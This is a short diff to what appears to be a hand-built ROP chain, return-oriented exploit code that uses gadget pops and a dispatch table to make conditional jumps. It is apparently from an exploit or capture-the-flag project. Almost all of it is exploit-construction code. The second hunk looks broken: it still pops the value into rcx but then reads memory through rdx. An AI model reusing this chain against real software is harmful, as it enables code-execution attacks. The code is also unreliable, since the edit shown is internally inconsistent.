@@ -30,9 +30,9 @@ movzx eax, al # now eax = (rdi==$ropchain1_end)
 
 # conditional jump
 shl rax, 3
-pop rcx
-dp dispatch_table+0x90
-mov rax, [rax + rcx - 0x90]
+pop rdx
+dp dispatch_table
+mov rax, [rax + rdx]
 pop rsi
 dp dispatch-0x10
 mov [rsi + 0x10], rax
@@ -52,8 +52,8 @@ mov rax, [rdi]
 # get offset from consts
 shl rax, 3
 pop rcx
-$consts_start + 0x90
-mov rax, [rax + rcx - 0x90]
+$consts_start
+mov rax, [rax + rdx]
 pop rsi
 dp offset-0x10
 mov [rsi + 0x10], rax
